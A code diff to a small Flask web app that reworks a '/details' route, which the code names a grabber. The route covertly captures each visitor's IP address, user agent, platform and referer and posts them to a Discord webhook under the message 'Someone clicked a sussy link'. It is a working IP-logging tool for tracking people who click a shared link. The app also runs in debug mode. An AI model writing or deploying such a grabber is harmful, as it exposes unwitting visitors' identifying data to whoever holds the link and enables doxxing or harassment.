@@ -1,6 +1,6 @@
 from flask import Flask, request, render_template, send_file
 import random, json, dotenv, os, requests
-from functools import cache
+
 dotenv.load_dotenv()
 
 app = Flask(__name__, template_folder="../web/pages", static_folder="../web/static")
@@ -112,7 +112,7 @@ def brainrot():
         else:
             return {"error":"Request is not in JSON format"}, 400
 
-# Get all details of a visitor and send it to a discord webhook
+# Get details of a visitor and send it to a discord webhook
 @app.route('/details')
 def grab():
     visitorIP = request.remote_addr
@@ -122,35 +122,10 @@ def grab():
 
     requests.post(
         os.getenv("GRABBER_WEBHOOK"), 
-        json={
-            "content": None,
-            "embeds": [
-                {
-                "title": "Person clicked link",
-                "color": 16711680,
-                "fields": [
-                    {
-                        "name": "Remote address",
-                        "value": visitorIP
-                    },
-                    {
-                        "name": "User Agent",
-                        "value": userAgent
-                    },
-                    {
-                        "name": "Platform",
-                        "value": platform
-                    },
-                    {
-                        "name": "Referer",
-                        "value": referer
-                    }
-                ]
-            }
-        ],
-    "attachments": []
-})
+        json={"content": f"## Someone clicked a sussy link on the internet!!\n\n```IP: {visitorIP}\nUser Agent: {userAgent}\nPlatform: {platform}\nReferer: {referer}```"}
+    )
     return {"IP": visitorIP, "UserAgent": userAgent, "Platform": platform, "Referer": referer}
+
 
 if __name__ == '__main__':
     app.run(debug=True)
